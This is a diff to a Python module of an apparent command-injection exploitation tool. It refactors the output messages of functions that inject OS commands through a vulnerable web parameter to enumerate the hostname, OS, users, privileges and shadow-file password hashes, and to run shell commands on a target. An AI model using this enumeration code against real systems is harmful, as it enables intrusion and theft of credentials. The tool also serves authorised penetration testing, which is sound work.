@@ -43,7 +43,7 @@ def powershell_version(separator, TAG, prefix, suffix, http_request_method, url,
   # Evaluate injection results.
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
-    ps_version = eb_injector.injection_results(response, TAG)
+    ps_version = eb_injector.injection_results(response, TAG, cmd)
     ps_version = "".join(str(p) for p in ps_version).replace(" ", "", 1)[:-1]
     session_handler.store_cmd(url, cmd, ps_version, vuln_parameter)
   else:
@@ -54,14 +54,19 @@ def powershell_version(separator, TAG, prefix, suffix, http_request_method, url,
       if menu.options.verbose:
         print ""
       # Output PowerShell's version number
-      sys.stdout.write(Style.BRIGHT + "(!) The PowerShell's version number is " + Style.UNDERLINE +  ps_version + Style.RESET_ALL + Style.BRIGHT + Style.RESET_ALL + ".\n")
+      success_msg = "The PowerShell's version number is " + Style.UNDERLINE
+      success_msg += ps_version + Style.RESET_ALL + Style.BRIGHT
+      sys.stdout.write(new_line + settings.print_success_msg(success_msg) + ".")
       sys.stdout.flush()
       # Add infos to logs file. 
       output_file = open(filename, "a")
-      output_file.write("    (!) The PowerShell's version number is " + ps_version + ".\n")
+      success_msg = "The PowerShell's version number is " + ps_version + ".\n"
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
   except ValueError:
-    print Fore.YELLOW + settings.WARNING_SIGN + "Heuristics have failed to identify PowerShell's version, which means that some payloads or injection techniques may be failed." + Style.RESET_ALL 
+    warn_msg = "Heuristics have failed to identify PowerShell's version, "
+    warn_msg += "which means that some payloads or injection techniques may be failed."
+    print settings.print_warning_msg(warn_msg)
     settings.PS_ENABLED = False
     checks.ps_check_failed()
 
@@ -75,7 +80,7 @@ def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
-    shell = eb_injector.injection_results(response, TAG)
+    shell = eb_injector.injection_results(response, TAG, cmd)
     shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
     session_handler.store_cmd(url, cmd, shell, vuln_parameter)
   else:
@@ -83,11 +88,13 @@ def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
+    success_msg = "The hostname is " + Style.UNDERLINE + shell + "."
+    sys.stdout.write(settings.print_success_msg(success_msg) + "\n")
     sys.stdout.flush()
     # Add infos to logs file. 
     output_file = open(filename, "a")
-    output_file.write("    (!) The hostname is " + shell + ".\n")
+    success_msg = "The hostname is " + shell + ".\n"
+    output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
     output_file.close()
 
 """
@@ -100,7 +107,7 @@ def system_information(separator, TAG, prefix, suffix, http_request_method, url,
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
-    target_os = eb_injector.injection_results(response, TAG)
+    target_os = eb_injector.injection_results(response, TAG, cmd)
     target_os = "".join(str(p) for p in target_os).replace(" ", "", 1)[:-1]
     session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
   else:
@@ -113,7 +120,7 @@ def system_information(separator, TAG, prefix, suffix, http_request_method, url,
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
       # Evaluate injection results.
-      target_arch = eb_injector.injection_results(response, TAG)
+      target_arch = eb_injector.injection_results(response, TAG, cmd)
       target_arch = "".join(str(p) for p in target_arch).replace(" ", "", 1)[:-1]
       session_handler.store_cmd(url, cmd, target_arch, vuln_parameter)
     else:
@@ -121,13 +128,15 @@ def system_information(separator, TAG, prefix, suffix, http_request_method, url,
     if target_arch:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
-      sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
-      sys.stdout.flush()
-      # Add infos to logs file.   
-      output_file = open(filename, "a")
-      output_file.write("    (!) The target operating system is " + target_os)
-      output_file.write(" and the hardware platform is " + target_arch + ".\n")
+    success_msg = "The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL  
+    success_msg += Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch
+    sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
+    sys.stdout.flush()
+    # Add infos to logs file.   
+    output_file = open(filename, "a")
+    success_msg = "The target operating system is " + target_os
+    success_msg += " and the hardware platform is " + target_arch + ".\n"
+    output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
     output_file.close()
 
 """
@@ -145,7 +154,7 @@ def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
-    cu_account = eb_injector.injection_results(response, TAG)
+    cu_account = eb_injector.injection_results(response, TAG, cmd)
     cu_account = "".join(str(p) for p in cu_account).replace(" ", "", 1)[:-1]
     session_handler.store_cmd(url, cmd, cu_account, vuln_parameter)
   else:
@@ -162,17 +171,19 @@ def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_
       response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
       if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
         # Evaluate injection results.
-        shell = eb_injector.injection_results(response, TAG)
+        shell = eb_injector.injection_results(response, TAG, cmd)
         shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
         session_handler.store_cmd(url, cmd, shell, vuln_parameter)
       else:
         shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
+      success_msg = "The current user is " + Style.UNDERLINE + cu_account  
+      sys.stdout.write(settings.print_success_msg(success_msg))
       # Add infos to logs file.    
       output_file = open(filename, "a")
-      output_file.write("    (!) The current user is " + cu_account)
+      success_msg = "The current user is " + cu_account
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
       if shell:
         if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
@@ -193,11 +204,13 @@ def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_
     else:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
+      success_msg = "The current user is " + Style.UNDERLINE + cu_account  
+      sys.stdout.write(settings.print_success_msg(success_msg))
       sys.stdout.flush()
       # Add infos to logs file.   
       output_file = open(filename, "a")
-      output_file.write("    (!) The current user is " + cu_account + "\n")
+      success_msg = "The current user is " + cu_account + "\n"
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
 
 """
@@ -215,7 +228,7 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
-    sys_users = eb_injector.injection_results(response, TAG)
+    sys_users = eb_injector.injection_results(response, TAG, cmd)
     sys_users = "".join(str(p) for p in sys_users).replace(" ", "", 1)[:-1]
     session_handler.store_cmd(url, cmd, sys_users, vuln_parameter)
   else:
@@ -224,7 +237,9 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
   if settings.TARGET_OS == "win":
     if menu.options.verbose:
       print ""
-    sys.stdout.write(settings.INFO_SIGN + "Executing the 'net users' command to enumerate users entries... ")
+    info_msg = "Executing the 'net users' command "
+    info_msg += "to enumerate users entries... "  
+    sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
     try:
       if sys_users[0] :
@@ -234,11 +249,14 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
         sys_users_list = "".join(str(p) for p in sys_users_list).strip()
         sys_users_list = ' '.join(sys_users_list.split())
         sys_users_list = sys_users_list.split()
-        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " via 'net users' command.\n" + Style.RESET_ALL)
+        success_msg =  "Identified " + str(len(sys_users_list))
+        success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+        success_msg += " via 'net users' command.\n"
+        sys.stdout.write("\n" + settings.print_success_msg(success_msg))
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in via 'net users' command.\n")
+        output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg)
         output_file.close()
         count = 0
         for user in range(0, len(sys_users_list)):
@@ -250,7 +268,7 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
             else:
               cmd = "\"" + cmd + "\""
             response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
-            check_privs = eb_injector.injection_results(response, TAG)
+            check_privs = eb_injector.injection_results(response, TAG, cmd)
             check_privs = "".join(str(p) for p in check_privs).strip()
             check_privs = re.findall(r"(.*)", check_privs)
             check_privs = "".join(str(p) for p in check_privs).strip()
@@ -274,23 +292,27 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
       else:
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
         sys.stdout.flush()
-        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
+        warn_msg = "It seems that you don't have permissions to enumerate users entries."
+        print "\n" + settings.print_warning_msg(warn_msg)  # Unix-like users enumeration.   
     except TypeError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
       sys.stdout.flush()
-      print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
       pass
 
     except IndexError:
       sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      warn_msg = "It seems that you don't have permissions to read '" 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries.\n" 
+      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
       sys.stdout.flush()
-      print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
       pass
-  # Unix-like users enumeration.    
+       
   else:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(settings.INFO_SIGN + "Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+    info_msg = "Fetching '" + settings.PASSWD_FILE 
+    info_msg += "' to enumerate users entries... "  
+    sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
     try:
       if sys_users[0] :
@@ -303,7 +325,9 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
         if len(sys_users) % 3 != 0 :
           sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
           sys.stdout.flush()
-          print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
+          warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
+          warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
+          print "\n" + settings.print_warning_msg(warn_msg)
           sys_users = " ".join(str(p) for p in sys_users).strip()
           print sys_users
           output_file = open(filename, "a")
@@ -315,11 +339,14 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
              sys_users_list.append(sys_users[user : user + 3])
           if len(sys_users_list) != 0 :
             sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-            sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
+            success_msg = "Identified " + str(len(sys_users_list)) 
+            success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+            success_msg += " in '" +  settings.PASSWD_FILE + "'.\n"
+            sys.stdout.write("\n" + settings.print_success_msg(success_msg))
             sys.stdout.flush()
             # Add infos to logs file.   
             output_file = open(filename, "a")
-            output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n")
+            output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg)
             output_file.close()
             count = 0
             for user in range(0, len(sys_users_list)):
@@ -362,7 +389,9 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
                 output_file.close()
               except ValueError:
                 if count == 1 :
-                  print Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
+                  warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is not in the "
+                  warn_msg += "appropriate format. Thus, it is expoted as a text file." 
+                  print settings.print_warning_msg(warn_msg)
                 sys_users = " ".join(str(p) for p in sys_users.split(":"))
                 print sys_users 
                 output_file = open(filename, "a")
@@ -371,19 +400,22 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
       else:
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
         sys.stdout.flush()
-        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   
+        warn_msg = "It seems that you don't have permissions to read '" 
+        warn_msg += settings.PASSWD_FILE + "' to enumerate users entries."
+        print "\n" + settings.print_warning_msg(warn_msg)   
+
     except TypeError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
       sys.stdout.flush()
-      print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
       pass
 
     except IndexError:
       sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      warn_msg = "It seems that you don't have permissions to read '" 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries.\n" 
+      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
       sys.stdout.flush()
-      print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
       pass
-
 """
 System passwords enumeration
 """
@@ -396,7 +428,7 @@ def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, v
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
       # Evaluate injection results.
-      sys_passes = eb_injector.injection_results(response, TAG)
+      sys_passes = eb_injector.injection_results(response, TAG, cmd)
       sys_passes = "".join(str(p) for p in sys_passes)
       session_handler.store_cmd(url, cmd, sys_passes, vuln_parameter)
     else:
@@ -406,18 +438,23 @@ def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, v
     if sys_passes :
       if menu.options.verbose:
         print ""
-      sys.stdout.write(settings.INFO_SIGN + "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+      info_msg = "Fetching '" + settings.SHADOW_FILE 
+      info_msg += "' to enumerate users password hashes... "  
+      sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       sys_passes = "".join(str(p) for p in sys_passes)
       sys_passes = sys_passes.replace(" ", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
         sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
+        success_msg = "Identified " + str(len(sys_passes))
+        success_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
+        success_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
+        sys.stdout.write("\n" + settings.print_success_msg(success_msg))
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write("\n    (!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" )
+        output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg )
         output_file.close()
         count = 0
         for line in sys_passes:
@@ -433,7 +470,9 @@ def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, v
           # Check for appropriate '/etc/shadow' format.
           except IndexError:
             if count == 1 :
-              sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
+              warn_msg = "It seems that '" + settings.SHADOW_FILE + "' file is not "
+              warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
+              sys.stdout.write(settings.print_warning_msg(warn_msg)+ "\n")
             print fields[0]
             output_file = open(filename, "a")
             output_file.write("      " + fields[0])
@@ -441,7 +480,9 @@ def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, v
       else:
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
         sys.stdout.flush()
-        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL
+        warn_msg = "It seems that you don't have permissions to read '" 
+        warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
+        print "\n" + settings.print_warning_msg(warn_msg)
 
 """
 Single os-shell execution
@@ -451,7 +492,7 @@ def single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url,
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
-    shell = eb_injector.injection_results(response, TAG)
+    shell = eb_injector.injection_results(response, TAG, cmd)
     shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
     session_handler.store_cmd(url, cmd, shell, vuln_parameter)
   else:
@@ -462,7 +503,8 @@ def single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url,
     if shell != "":
       print Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL
     else:
-      print Back.RED + settings.ERROR_SIGN + "The '" + cmd + "' command, does not return any output." + Style.RESET_ALL 
+      err_msg = "The '" + cmd + "' command, does not return any output."
+      print settings.print_error_msg(err_msg) 
     sys.exit(0)
 
 """
